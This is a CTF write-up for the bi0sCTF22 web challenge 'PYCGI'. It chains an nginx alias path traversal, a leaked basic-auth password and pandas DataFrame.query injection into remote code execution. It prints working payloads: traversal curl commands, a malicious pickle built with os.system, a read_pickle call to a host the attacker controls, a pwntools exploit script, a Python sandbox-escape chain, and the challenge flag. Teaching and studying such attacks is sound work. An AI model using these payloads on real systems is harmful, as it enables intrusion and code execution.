---
title: PYCGI-bi0sCTF22
date: 2023-01-23
author: Yadhu Krishna M
author_url: https://twitter.com/YadhuKrishna_
categories: 
    - Web 
tags: 
    - Panda
    - RCE
    - nginx misconfiguration
---



**tl;dr**
    -Get the docker-entrypoint.sh using /static../docker-entrypoint.sh
    -Get the challenge files using /static../panda/cgi-bin/search_currency.py
    -Host your exploit and use x'|@pd.read_pickle('http://0.0.0.0:6334/output.exploit')|' to execute the exploit

<!--more-->

**Challenge points**: 887
**No. of solves**: 17



## Challenge Description

Hope its working. Can you check?
Note: No bruteforcing is required to solve this challenge.
The source code of this challenge can be downloaded from [here](https://github.com/yadhukrishnam/bi0sCTF22).


## Analysis

We are provided with 2 attachments for this challenge:
1. Dockerfile
2. Nginx.conf

Looking into the Nginx configuration, we can find that there is a potential path traversal in the `/static` endpoint. You can read more about this [here](https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md).
```css
location /static {
    alias /static/; 
}
```

Upon opening the challenge, we are presented with a directory indexing. 

![](https://i.imgur.com/d2E5x6Y.png)

Accessing the `cgi-bin` directory requires authentication.

Inside the templates folder we have an `index.html` file that discloses a filename - `search_currency.py`.


## Exploit

### Exploiting File Read

The path traversal can be exploited with:

```shell
curl http://instance.chall.bi0s.in:10846/static../etc/passwd --path-as-is
```

With this, we can retrieve and inspect some known files from the server.

### Gaining access to the service

On exploiting the Nginx path traversal, we can read `docker-entrypoint.sh`. 


![](https://i.imgur.com/eauklrJ.png)

`docker-entrypoint.sh` is a shell script that is typically used as the entrypoint for a Docker container. The purpose of the entrypoint script is to set up the environment and perform any necessary tasks before the main command or application is run. 

The script does the following:

1. It moves the file `flag.txt` to a new random location. 
2. The htpasswd command is used to create user named `admin` in the `/etc/.htpasswd` file with a specified password. This is used to protect the directory.
3. Spawns Nginx and FCGI.

The password specified in the htpasswd command is a non-printable character.

```
In [13]: ord('­')
Out[13]: 173
```

We can use this to access the service. 

## Understanding the service

We can use the path traversal vulnerability to read the contents of `search_currency.py`.

```bash
curl http://instance.chall.bi0s.in:10846/static../panda/cgi-bin/search_currency.py --path-as-is
```

```py
#!/usr/bin/python3

from server import Server
import pandas as pd

try:
    df = pd.read_csv("../database/currency-rates.csv")
    server = Server()
    server.set_header("Content-Type", "text/html")
    params = server.get_params()
    assert "currency_name" in params
    currency_code = params["currency_name"]
    results = df.query(f"currency == '{currency_code}'")
    server.add_body(results.to_html())
    server.send_response()
except Exception as e:
    print("Content-Type: text/html")
    print()
    print("Exception")
    print(str(e))
```

This script reads data from the CSV file and filters it based on a `currency_code` parameter, and returns the filtered data in the form of an HTML table in the HTTP response. 

### Code Injection ?

Upon looking closely, we find that the `currency_code` is directly passed into `df.query`. This appears similar to an SQL Injection.

If we take a look at the [implementation](https://github.com/pandas-dev/pandas/blob/2e218d10984e9919f0296931d92ea851c6a6faf5/pandas/core/frame.py#L4474) of `DataFrame.query` we can see that it uses `DataFrame.eval` internally. `DataFrame.eval` is considered dangerous if user-controllable input is passed, as stated in the [documentation](https://pandas.pydata.org/docs/reference/api/pandas.DataFrame.eval.html).

### Exploiting DataFrame.query

From the [documentation](https://pandas.pydata.org/docs/reference/api/pandas.DataFrame.query.html#pandas.DataFrame.query), it is clear that it is possible to refer to variables in the environment by prefixing them with an ‘@’ character like `@a + b`

Example:

```python
In [1]: import pandas as pd
p
In [2]: df = pd.read_csv("currency-rates.csv")

In [3]: a = 'ZUBI'

In [4]: df.query("currency == @a")
Out[4]: 
  currency  values
4     ZUBI    12.7
```

With this, it is now possible to access any global variable, and even invoke functions. 

```python
In [9]: def say_hello():
   ...:     print ("Hello World")
   ...: 

In [10]: df.query("currency == @say_hello()")
Hello World
Out[10]: 
Empty DataFrame
Columns: [currency, values]
Index: []
```

### Escalating to RCE

There could be multiple ways of gaining an RCE at this point. Here we look into two approaches:

#### Using Pandas

Pandas is a huge library supporting various functions. We could directly use this to gain an RCE. One possible solution is to use [pandas.read_pickle](https://pandas.pydata.org/docs/reference/api/pandas.read_pickle.html).

Example:

We prepare a pickled payload using the below code:

```python
import pickle
import os
import http.server
import socketserver
import random

command = "ls /"

class payload():
    def __reduce__(self):
        return os.system, ("{}".format(command),)


pickle.dump(payload(), open("output.exploit", "wb"))
```

The `output.exploit` file can be then hosted on a server. The below payload can be used to trigger pickle deserialization on the server, thus running our exploit script.

```
'|@pd.read_pickle('http://0.0.0.0:6334/output.exploit')|'
```

```python
import sys
import re
from pwn import *

exploit = sys.argv[1]

host="34.93.222.6"
port=10466

currency_name = f"x'|@pd.read_pickle('{exploit}/output.exploit')|'"
Authorization = "Basic YWRtaW46wq0="
path="/cgi-bin/search_currency.py"+"?currency_name="+currency_name
con = remote(host, port)
con.sendline(f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\nAuthorization: {Authorization}\r\n\r\n".encode())

print(re.findall(r"bi0sctf{.*}", con.recv().decode())[0])
```

#### Using Chains

```
'|''.__class__.__mro__[1].__subclasses__()[127].__init__.__globals__['builtins'].exec('import os;os.system(\"ls\");')|'
```

## Flag

```
bi0sCTF{9a18559a42e7302b15eeb45c09ab39d6}
```